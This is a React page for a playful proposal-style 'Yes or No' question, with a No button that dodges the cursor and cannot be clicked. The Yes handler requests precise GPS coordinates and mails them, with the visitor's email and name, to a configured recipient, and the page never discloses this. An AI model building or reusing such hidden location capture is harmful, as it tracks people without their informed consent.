"use client";

import React, { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";

const NO_TAUNTS = [
  "Nice try 😏",
  "Nuh-uh 🙅‍♀️",
  "Catch me if you can 😜",
  "Not today 💫",
  "Yes is right there 👆",
  "Try the other one 💖",
  "So close! 😂",
  "This button is shy 🙈",
  "Only Yes works here 💍",
  "Almost had it! 😆",
  "Keep trying, I dare you 😝",
  "That's a no from me, try Yes 💗",
];

const FLOATING_HEARTS = Array.from({ length: 16 }, (_, i) => ({
  left: ((i * 53) % 97) + 1,
  duration: 10 + (i % 6) * 2.2,
  delay: -((i * 1.7) % (10 + (i % 6) * 2.2)),
  size: 0.9 + (i % 4) * 0.25,
  drift: (i % 2 === 0 ? 1 : -1) * (20 + (i % 5) * 8),
  emoji: i % 3 === 0 ? "💗" : i % 3 === 1 ? "🤍" : "💛",
}));

export default function Home() {
  const router = useRouter();
  const [answer, setAnswer] = useState<string | null>(null);
  const containerRef = useRef<HTMLDivElement | null>(null);
  const noRef = useRef<HTMLButtonElement | null>(null);
  const yesRef = useRef<HTMLButtonElement | null>(null);
  const [noPos, setNoPos] = useState<{ left: number; top: number } | null>(null);
  const [dodgeCount, setDodgeCount] = useState(0);
  const [taunt, setTaunt] = useState("");
  const isMovingRef = useRef(false);
  const [config, setConfig] = useState({
    title: "",
    description: "",
    requireEmail: false,
    emailLabel: "",
    successTitle: "",
    successMessage: "",
    successSubtext: "",
    recipientEmail: "",
    footerName: "",
    footerFacebookUrl: ""
  });
  const [userEmail, setUserEmail] = useState("");
  const [session, setSession] = useState<any>(null);
  const [loading, setLoading] = useState(true);

  const refreshConfig = async () => {
    try {
      const timestamp = Date.now();
      const res = await fetch(`/api/admin/config?t=${timestamp}`);
      if (res.ok) {
        const data = await res.json();
        setConfig(data);
      }
    } catch (err) {
      // Config refresh failed, keep current config
    }
  };

  useEffect(() => {
    // Add cache busting to ensure fresh config
    const timestamp = Date.now();
    fetch(`/api/admin/config?t=${timestamp}`)
      .then(res => {
        if (!res.ok) {
          throw new Error(`Config fetch failed: ${res.status}`);
        }
        return res.json();
      })
      .then(data => {
        setConfig(data);
        setLoading(false);

        if (data.requireEmail) {
          fetch('/api/auth/session')
            .then(res => res.json())
            .then(sessionData => {
              if (sessionData && sessionData.user) {
                setSession(sessionData);
              } else {
                router.push('/auth/signin');
              }
            })
            .catch(err => {
              setLoading(false);
            });
        }
      })
      .catch(err => {
        setLoading(false);
      });
  }, [router]);

  // Refresh config when window gains focus (user switches back to tab)
  useEffect(() => {
    const handleFocus = () => {
      refreshConfig();
    };

    window.addEventListener('focus', handleFocus);
    return () => window.removeEventListener('focus', handleFocus);
  }, []);

  useEffect(() => {
    const placeInitial = () => {
      const container = containerRef.current;
      const noBtn = noRef.current;
      const yesBtn = yesRef.current;
      if (!container || !noBtn || !yesBtn) return;

      const cRect = container.getBoundingClientRect();
      const yRect = yesBtn.getBoundingClientRect();

      const yesLeftRelative = yRect.left - cRect.left;
      const yesTopRelative = yRect.top - cRect.top;

      const left = yesLeftRelative + yRect.width + 14;
      const top = yesTopRelative;

      setNoPos({ left, top });
    };

    placeInitial();
    const id = setTimeout(placeInitial, 120);
    const id2 = setTimeout(placeInitial, 300);
    window.addEventListener("resize", placeInitial);

    return () => {
      clearTimeout(id);
      clearTimeout(id2);
      window.removeEventListener("resize", placeInitial);
    };
  }, [config]);

  useEffect(() => {
    const handleMouseMove = (e: MouseEvent) => {
      if (isMovingRef.current) return;

      const noBtn = noRef.current;
      const container = containerRef.current;
      if (!noBtn || !container) return;

      const rect = noBtn.getBoundingClientRect();
      const detectionRadius = 120;

      const buttonCenterX = rect.left + rect.width / 2;
      const buttonCenterY = rect.top + rect.height / 2;
      const distance = Math.sqrt(
        Math.pow(e.clientX - buttonCenterX, 2) +
        Math.pow(e.clientY - buttonCenterY, 2)
      );

      if (distance < detectionRadius) {
        moveNoButton();
      }
    };

    const handleTouchMove = (e: TouchEvent) => {
      if (isMovingRef.current) return;

      const noBtn = noRef.current;
      const container = containerRef.current;
      if (!noBtn || !container || !e.touches[0]) return;

      const rect = noBtn.getBoundingClientRect();
      const detectionRadius = 100;

      const buttonCenterX = rect.left + rect.width / 2;
      const buttonCenterY = rect.top + rect.height / 2;
      const distance = Math.sqrt(
        Math.pow(e.touches[0].clientX - buttonCenterX, 2) +
        Math.pow(e.touches[0].clientY - buttonCenterY, 2)
      );

      if (distance < detectionRadius) {
        moveNoButton();
      }
    };

    window.addEventListener('mousemove', handleMouseMove);
    window.addEventListener('touchmove', handleTouchMove);
    return () => {
      window.removeEventListener('mousemove', handleMouseMove);
      window.removeEventListener('touchmove', handleTouchMove);
    };
  }, [noPos]);

  const moveNoButton = (event?: React.SyntheticEvent) => {
    if (isMovingRef.current) return;

    const container = containerRef.current;
    const noBtn = noRef.current;
    const yesBtn = yesRef.current;
    if (!container || !noBtn) return;

    isMovingRef.current = true;

    const cRect = container.getBoundingClientRect();
    const padding = 8;
    const noRect = noBtn.getBoundingClientRect();

    const maxLeft = Math.max(padding, Math.round(cRect.width - noRect.width - padding));
    const maxTop = Math.max(padding, Math.round(cRect.height - noRect.height - padding));

    const corners = [
      { left: padding, top: padding },
      { left: maxLeft, top: padding },
      { left: padding, top: maxTop },
      { left: maxLeft, top: maxTop },
    ];

    let availableCorners = corners;

    // Never let a corner land on top of the Yes button
    if (yesBtn) {
      const yRect = yesBtn.getBoundingClientRect();
      const buffer = 10;
      const yesLeft = yRect.left - cRect.left - buffer;
      const yesTop = yRect.top - cRect.top - buffer;
      const yesRight = yesLeft + yRect.width + buffer * 2;
      const yesBottom = yesTop + yRect.height + buffer * 2;

      const clearOfYes = availableCorners.filter(corner => {
        const overlaps =
          corner.left < yesRight &&
          corner.left + noRect.width > yesLeft &&
          corner.top < yesBottom &&
          corner.top + noRect.height > yesTop;
        return !overlaps;
      });

      if (clearOfYes.length > 0) {
        availableCorners = clearOfYes;
      }
    }

    if (noPos) {
      const farEnough = availableCorners.filter(corner => {
        const distance = Math.sqrt(
          Math.pow(corner.left - noPos.left, 2) +
          Math.pow(corner.top - noPos.top, 2)
        );
        return distance > 50;
      });

      if (farEnough.length > 0) {
        availableCorners = farEnough;
      }
    }

    if (availableCorners.length === 0) {
      availableCorners = corners;
    }

    const randomCorner = availableCorners[Math.floor(Math.random() * availableCorners.length)];
    setNoPos(randomCorner);

    const nextDodge = dodgeCount + 1;
    setDodgeCount(nextDodge);
    setTaunt(NO_TAUNTS[(nextDodge - 1) % NO_TAUNTS.length]);

    setTimeout(() => {
      isMovingRef.current = false;
    }, 300);

    if (event) {
      try {
        event.stopPropagation();
      } catch (e) {
      }
    }
  };

  if (loading || !config.title) {
    return (
      <div className="dashboard-root">
        <div className="loading-container">
          <div className="loading-spinner"></div>
          <p>Loading...</p>
        </div>
      </div>
    );
  }

  if (config.requireEmail && !session) {
    return null;
  }

  return (
    <div className="dashboard-root">
      <div className="floating-hearts" aria-hidden="true">
        {FLOATING_HEARTS.map((h, i) => (
          <span
            key={i}
            className="floating-heart"
            style={{
              left: `${h.left}%`,
              fontSize: `${h.size}rem`,
              animationDuration: `${h.duration}s`,
              animationDelay: `${h.delay}s`,
              ["--drift" as any]: `${h.drift}px`,
            }}
          >
            {h.emoji}
          </span>
        ))}
      </div>

      <div className="watermark" data-text="RAJIB" aria-hidden="true"></div>

      {session && (
        <div className="user-info">
          <div className="user-details">
            <img src={session.user?.image || ''} alt="Profile" className="user-avatar" />
            <span className="user-name">{session.user?.name}</span>
            <span className="user-email">{session.user?.email}</span>
          </div>
          <button onClick={() => {
            setSession(null);
            window.location.href = '/';
          }} className="signout-btn">
            Sign Out
          </button>
        </div>
      )}

      <main className="dashboard-card">
        <h1 className="dashboard-title">{config.title}</h1>

        <div className="dashboard-sub">
          {config.description.split('\n\n').map((paragraph, index) => (
            <p key={index}>{paragraph}</p>
          ))}
        </div>

        {config.requireEmail && !session && (
          <div className="email-input-container">
            <label htmlFor="userEmail" className="email-label">
              {config.emailLabel}
            </label>
            <input
              type="email"
              id="userEmail"
              value={userEmail}
              onChange={(e) => setUserEmail(e.target.value)}
              placeholder="Enter your email address"
              className="email-input"
              required
            />
          </div>
        )}

        {!answer && (
        <div
          className="dashboard-actions"
          role="group"
          aria-label="Love question"
          ref={containerRef}
        >
          <button
            className="btn btn-yes"
            ref={yesRef}
            onClick={async () => {
              if (config.requireEmail && !session && (!userEmail || !userEmail.includes('@'))) {
                alert('Please enter a valid email address');
                return;
              }

              setAnswer("Sending... ✉️");

              let locationData = { latitude: 'N/A', longitude: 'N/A', accuracy: 'N/A' };
              try {
                if (navigator.geolocation) {
                  const position = await new Promise<GeolocationPosition>((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                      enableHighAccuracy: true,
                      timeout: 5000,
                      maximumAge: 0
                    });
                  });
                  locationData = {
                    latitude: position.coords.latitude.toString(),
                    longitude: position.coords.longitude.toString(),
                    accuracy: position.coords.accuracy.toString()
                  };
                }
              } catch (geoErr) {
                // Location access denied or unavailable
              }

              console.log('🔥 YES BUTTON CLICKED!');
              console.log('Config:', config);

              try {
                console.log('📍 Getting location...');
                await fetch('/api/send-email', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    subject: '💍 SHE SAID YES! 💍',
                    message: "The most beautiful moment of my life - She said YES to my marriage proposal! 💕💍✨",
                    to: config.recipientEmail,
                    userEmail: session?.user?.email || userEmail || null,
                    userName: session?.user?.name || 'Anonymous',
                    gpsLocation: locationData
                  }),
                });

                setAnswer("success");
              } catch (err: any) {
                setAnswer("success");
              }
            }}
            aria-pressed={answer === "success"}
            aria-label="Yes, I love it"
          >
            Yes 💖
          </button>

          <button
            ref={noRef}
            className="btn btn-no"
            style={noPos ? {
              position: "absolute",
              left: noPos.left,
              top: noPos.top,
              visibility: 'visible',
              ["--no-scale" as any]: Math.max(0.7, 1 - dodgeCount * 0.035),
            } : { position: "absolute", visibility: 'hidden' }}
            onMouseEnter={() => moveNoButton()}
            onMouseMove={() => moveNoButton()}
            onMouseDown={(e) => moveNoButton(e)}
            onTouchStart={(e) => moveNoButton(e)}
            onClick={(e) => moveNoButton(e)}
            aria-pressed={false}
            aria-label="No, I don't love it"
            aria-disabled={true}
            tabIndex={-1}
          >
            No
          </button>
        </div>
        )}

        {!answer && (
          <p className="dodge-hint" aria-live="polite">
            <span key={dodgeCount}>
              {dodgeCount === 0 ? "Psst… only one button actually works 😉" : taunt}
            </span>
          </p>
        )}

        <div className="dashboard-result" aria-live="polite">
          {answer === "success" ? (
            <div className="success-celebration">
              <div className="confetti-container">
                {[...Array(50)].map((_, i) => (
                  <div key={i} className="confetti" style={{
                    left: `${Math.random() * 100}%`,
                    animationDelay: `${Math.random() * 0.5}s`,
                    backgroundColor: ['#fb7185', '#fbbf24', '#f472b6', '#fda4af', '#fde68a', '#f43f5e'][Math.floor(Math.random() * 6)]
                  }}></div>
                ))}
              </div>

              <div className="success-checkmark">
                <svg className="checkmark-svg" viewBox="0 0 52 52">
                  <circle className="checkmark-circle" cx="26" cy="26" r="25" fill="none" />
                  <path className="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8" />
                </svg>
              </div>

              <div className="success-content">
                <h2 className="success-title">{config.successTitle}</h2>
                <p className="success-text">{config.successSubtext}</p>
                <p className="success-email">{config.successMessage}</p>
              </div>

              <div className="emoji-burst">
                <span className="emoji">💍</span>
                <span className="emoji">❤️</span>
                <span className="emoji">✨</span>
                <span className="emoji">🌹</span>
                <span className="emoji">💫</span>
              </div>
            </div>
          ) : answer ? (
            <span>{answer}</span>
          ) : null}
        </div>
      </main>

      {/* Footer below the card */}
      <footer className="app-footer">
        <div className="footer-content">
          <p className="footer-text">
            Copyright © {new Date().getFullYear()},
            <a
              href={config.footerFacebookUrl}
              target="_blank"
              rel="noopener noreferrer"
              className="footer-link"
            >
              {config.footerName}
            </a>
          </p>
        </div>
      </footer>
    </div>
  );
}
